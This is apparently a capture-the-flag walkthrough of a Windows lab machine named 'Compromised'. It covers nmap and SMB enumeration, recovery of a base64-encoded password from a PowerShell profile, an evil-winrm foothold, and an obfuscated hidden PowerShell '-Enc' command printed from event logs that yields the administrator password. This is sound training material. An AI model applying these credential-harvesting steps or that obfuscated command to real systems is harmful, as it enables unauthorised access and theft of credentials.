# Compromised
### Enumeration
```
# Nmap 7.92 scan initiated Wed Apr 20 21:03:30 2022 as: nmap -sCV -v -p- -oN tcp.out 192.168.219.152
Nmap scan report for ip-192-168-219-152.eu-west-1.compute.internal (192.168.219.152)
Host is up (0.014s latency).
Not shown: 65528 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
| tls-alpn:
|_  http/1.1
|_ssl-date: 2022-04-20T21:07:18+00:00; 0s from scanner time.
|_http-server-header: Microsoft-IIS/10.0
| ssl-cert: Subject: commonName=PowerShellWebAccessTestWebSite
| Issuer: commonName=PowerShellWebAccessTestWebSite
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2021-06-01T08:00:08
| Not valid after:  2021-08-30T08:00:08
| MD5:   b7f6 d9ee 88ed 8557 836c 5955 9ace 0128
|_SHA-1: 85a3 b573 101e d137 0acf e7fd 3838 ca07 22ed c211
|_http-title: IIS Windows Server
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49666/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2022-04-20T21:06:41
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Apr 20 21:07:18 2022 -- 1 IP address (1 host up) scanned in 227.79 seconds
```

##### 80
IIS default page.

##### SMB
Had to specifically specify anonymous user:

```
smbmap -H 192.168.219.152 -u 'anonymous'

[+] Guest session       IP: 192.168.219.152:445 Name: ip-192-168-219-152.eu-west-1.compute.internal
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        Scripts$                                                READ ONLY
        Users$                                                  READ ONLY
```

I connected to each of the shares and looked for interesting files:

```
smbclient '//192.168.219.152/Users$' -u 'anonymous'
> recurse
> prompt
> mget *
```

I didn't find anything useful in `Scripts$`. Looking in `Users$`, there was a file `\scripting\Desktop\README.txt` which had a warning about storing passwords:

```
Please keep your personal shares locked down. Just because it's hidden it doesn't mean it's not accessible. Also, please stop storing passwords in your scripts. Encoding is not encryption and this information can be lifted from the logs. -Security
```

so I grep'd for `pass`:

```
grep -irHn pass .
```

and found `scripting/Documents/WindowsPowerShell/profile.ps1`:

```powershell
$password = ConvertTo-SecureString "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RgByAGkAZQBuAGQAcwBEAG8AbgB0AEwAZQB0AEYAcgBpAGUAbgBkAHMAQgBhAHMAZQA2ADQAUABhAHMAcwB3AG8AcgBkAHMA')))" -AsPlainText -Force
```

This decodes to `FriendsDontLetFriendsBase64Passwords`. In the `Scripts$` share, we saw the following line in a powershell script:

```powershell
$credential = New-Object System.Management.Automation.PSCredential ('scripting', $password)
```

So the credentials are probably `scripting:FriendsDontLetFriendsBase64Passwords`.

### Foothold
We try these credentials with `evil-winrm` and we get a shell as `compromised\scripting`. We grab the local flag from the Desktop.

### Privilege Escalation
In the root, there's a non-standard folder called `Troubleshooting`. It contains a scripts `logs.ps1` with the contents:

```powershell
Get-EventLog -LogName 'Windows Powershell' | Export-CSV C:\Troubleshooting\powershell-logs.csv
```

After running, I exfiltrated by moving to `C:\Users\scripting` and grabbing via SMB, since `evil-winrm` wouldn't let me `download` for some reason. We notice the following entry:

```
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc JABPAHcAbgBlAGQAIAA9ACAAQAAoACkAOwAkAE8AdwBuAGUAZAAgACsAPQAgAHsAJABEAGUAYwBvAGQAZQBkACAAPQAgAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAEgANABzAEkAQQBBAEEAQQBBAEEAQQBFAEEAQQB2AEoAUwBBADMATwBTAE0AMwBKADgAUwB6ADIAegBVAHoAUABLAE0AbABNAEwAUQByAEoAUwBNAHcATABBAFkAcQBXADUAeABlAGwASwBBAEkAQQAwADcAeABrAEgAQgA4AEEAQQBBAEEAPQAiACkAfQA7ACQATwB3AG4AZQBkACAAKwA9ACAAewBbAHMAdAByAGkAbgBnAF0AOgA6AGoAbwBpAG4AKAAnACcALAAgACgAIAAoADgAMwAsADEAMQA2ACwAOQA3ACwAMQAxADQALAAxADEANgAsADQANQAsADgAMwAsADEAMAA4ACwAMQAwADEALAAxADAAMQAsADEAMQAyACwAMwAyACwANAA1ACwAOAAzACwAMQAwADEALAA5ADkALAAxADEAMQAsADEAMQAwACwAMQAwADAALAAxADEANQAsADMAMgAsADUAMwApACAAfAAlAHsAIAAoACAAWwBjAGgAYQByAF0AWwBpAG4AdABdACAAJABfACkAfQApACkAIAB8ACAAJgAgACgAKABnAHYAIAAiACoAbQBkAHIAKgAiACkALgBuAGEAbQBlAFsAMwAsADEAMQAsADIAXQAtAGoAbwBpAG4AJwAnACkAfQA7ACQATwB3AG4AZQBkACAAKwA9ACAAewBpAGYAKAAkAGUAbgB2ADoAYwBvAG0AcAB1AHQAZQByAG4AYQBtAGUAIAAtAGUAcQAgACIAYwBvAG0AcAByAG8AbQBpAHMAZQBkACIAKQAgAHsAZQB4AGkAdAB9AH0AOwAkAE8AdwBuAGUAZAAgACsAPQAgAHsAWwBzAHQAcgBpAG4AZwBdADoAOgBqAG8AaQBuACgAJwAnACwAIAAoACAAKAAxADAANQAsADEAMAAyACwAMwAyACwANAAwACwAMQAxADYALAAxADAAMQAsADEAMQA1ACwAMQAxADYALAA0ADUALAA5ADkALAAxADEAMQAsADEAMQAwACwAMQAxADAALAAxADAAMQAsADkAOQAsADEAMQA2ACwAMQAwADUALAAxADEAMQAsADEAMQAwACwAMwAyACwANQA2ACwANAA2ACwANQA2ACwANAA2ACwANQA2ACwANAA2ACwANQA2ACwAMwAyACwANAA1ACwAOAAxACwAMQAxADcALAAxADAANQAsADEAMAAxACwAMQAxADYALAA0ADEALAAzADIALAAxADIAMwAsADEAMAAxACwAMQAyADAALAAxADAANQAsADEAMQA2ACwAMQAyADUAKQAgAHwAJQB7ACAAKAAgAFsAYwBoAGEAcgBdAFsAaQBuAHQAXQAgACQAXwApAH0AKQApACAAfAAgACYAIAAoACgAZwB2ACAAIgAqAG0AZAByACoAIgApAC4AbgBhAG0AZQBbADMALAAxADEALAAyAF0ALQBqAG8AaQBuACcAJwApAH0AOwAkAE8AdwBuAGUAZAAgACsAPQAgAHsAWwBzAHQAcgBpAG4AZwBdADoAOgBqAG8AaQBuACgAJwAnACwAIAAoACAAKAAxADAANQAsADEAMAAyACwAMwAyACwANAAwACwAMwA2ACwAMQAxADEALAAxADEAOQAsADEAMQAwACwAMQAwADEALAAxADAAMAAsADkAMQAsADUAMAAsADkAMwAsADQANgAsADgANAAsADEAMQAxACwAOAAzACwAMQAxADYALAAxADEANAAsADEAMAA1ACwAMQAxADAALAAxADAAMwAsADQAMAAsADQAMQAsADMAMgAsADQANQAsADEAMQAwACwAMQAwADEALAAzADIALAAzADkALAAxADAANQAsADEAMAAyACwANAAwACwAMwA2ACwAMQAwADEALAAxADEAMAAsADEAMQA4ACwANQA4ACwAOQA5ACwAMQAxADEALAAxADAAOQAsADEAMQAyACwAMQAxADcALAAxADEANgAsADEAMAAxACwAMQAxADQALAAxADEAMAAsADkANwAsADEAMAA5ACwAMQAwADEALAAzADIALAA0ADUALAAxADAAMQAsADEAMQAzACwAMwAyACwAMwA0ACwAOQA5ACwAMQAxADEALAAxADAAOQAsADEAMQAyACwAMQAxADQALAAxADEAMQAsADEAMAA5ACwAMQAwADUALAAxADEANQAsADEAMAAxACwAMQAwADAALAAzADQALAA0ADEALAAzADIALAAxADIAMwAsADEAMAAxACwAMQAyADAALAAxADAANQAsADEAMQA2ACwAMQAyADUALAAzADkALAA0ADEALAAzADIALAAxADIAMwAsADEAMAAxACwAMQAyADAALAAxADAANQAsADEAMQA2ACwAMQAyADUALAAzADIALAA2ADkALAAxADAAOAAsADEAMQA1ACwAMQAwADEALAAzADIALAAxADIAMwAsADMANgAsADEAMAA5ACwAMQAxADUALAAzADIALAA2ADEALAAzADIALAA0ADAALAA3ADgALAAxADAAMQAsADEAMQA5ACwANAA1ACwANwA5ACwAOQA4ACwAMQAwADYALAAxADAAMQAsADkAOQAsADEAMQA2ACwAMwAyACwAOAAzACwAMQAyADEALAAxADEANQAsADEAMQA2ACwAMQAwADEALAAxADAAOQAsADQANgAsADcAMwAsADcAOQAsADQANgAsADcANwAsADEAMAAxACwAMQAwADkALAAxADEAMQAsADEAMQA0ACwAMQAyADEALAA4ADMALAAxADEANgAsADEAMQA0ACwAMQAwADEALAA5ADcALAAxADAAOQAsADQAMAAsADMANgAsADYAOAAsADEAMAAxACwAOQA5ACwAMQAxADEALAAxADAAMAAsADEAMAAxACwAMQAwADAALAA0ADQALAA0ADgALAA0ADQALAAzADYALAA2ADgALAAxADAAMQAsADkAOQAsADEAMQAxACwAMQAwADAALAAxADAAMQAsADEAMAAwACwANAA2ACwANwA2ACwAMQAwADEALAAxADEAMAAsADEAMAAzACwAMQAxADYALAAxADAANAAsADQAMQAsADQAMQAsADEAMgA1ACkAIAB8ACUAewAgACgAIABbAGMAaABhAHIAXQBbAGkAbgB0AF0AIAAkAF8AKQB9ACkAKQAgAHwAIAAmACAAKAAoAGcAdgAgACIAKgBtAGQAcgAqACIAKQAuAG4AYQBtAGUAWwAzACwAMQAxACwAMgBdAC0AagBvAGkAbgAnACcAKQB9ADsAJABPAHcAbgBlAGQAIAArAD0AIAB7AFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABTAHQAcgBpAG4AZwAoAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAEsAQQBCAE8AQQBHAFUAQQBkAHcAQQB0AEEARQA4AEEAWQBnAEIAcQBBAEcAVQBBAFkAdwBCADAAQQBDAEEAQQBVAHcAQgA1AEEASABNAEEAZABBAEIAbABBAEcAMABBAEwAZwBCAEoAQQBFADgAQQBMAGcAQgBUAEEASABRAEEAYwBnAEIAbABBAEcARQBBAGIAUQBCAFMAQQBHAFUAQQBZAFEAQgBrAEEARwBVAEEAYwBnAEEAbwBBAEUANABBAFoAUQBCADMAQQBDADAAQQBUAHcAQgBpAEEARwBvAEEAWgBRAEIAagBBAEgAUQBBAEkAQQBCAFQAQQBIAGsAQQBjAHcAQgAwAEEARwBVAEEAYgBRAEEAdQBBAEUAawBBAFQAdwBBAHUAQQBFAE0AQQBiAHcAQgB0AEEASABBAEEAYwBnAEIAbABBAEgATQBBAGMAdwBCAHAAQQBHADgAQQBiAGcAQQB1AEEARQBjAEEAVwBnAEIAcABBAEgAQQBBAFUAdwBCADAAQQBIAEkAQQBaAFEAQgBoAEEARwAwAEEASwBBAEEAawBBAEcAMABBAGMAdwBBAHMAQQBDAEEAQQBXAHcAQgBUAEEASABrAEEAYwB3AEIAMABBAEcAVQBBAGIAUQBBAHUAQQBFAGsAQQBUAHcAQQB1AEEARQBNAEEAYgB3AEIAdABBAEgAQQBBAGMAZwBCAGwAQQBIAE0AQQBjAHcAQgBwAEEARwA4AEEAYgBnAEEAdQBBAEUATQBBAGIAdwBCAHQAQQBIAEEAQQBjAGcAQgBsAEEASABNAEEAYwB3AEIAcABBAEcAOABBAGIAZwBCAE4AQQBHADgAQQBaAEEAQgBsAEEARgAwAEEATwBnAEEANgBBAEUAUQBBAFoAUQBCAGoAQQBHADgAQQBiAFEAQgB3AEEASABJAEEAWgBRAEIAegBBAEgATQBBAEsAUQBBAHAAQQBDAGsAQQBMAGcAQgB5AEEARwBVAEEAWQBRAEIAawBBAEgAUQBBAGIAdwBCAGwAQQBHADQAQQBaAEEAQQBvAEEAQwBrAEEAIgApACkAIAB8ACAAaQBlAHgAfQA7ACQATwB3AG4AZQBkACAAfAAgACUAIAB7ACQAXwB8AGkAZQB4AH0A
```

This command can be decoded to retrieve the administrator password, which is `TheShellIsMightierThanTheSword!`.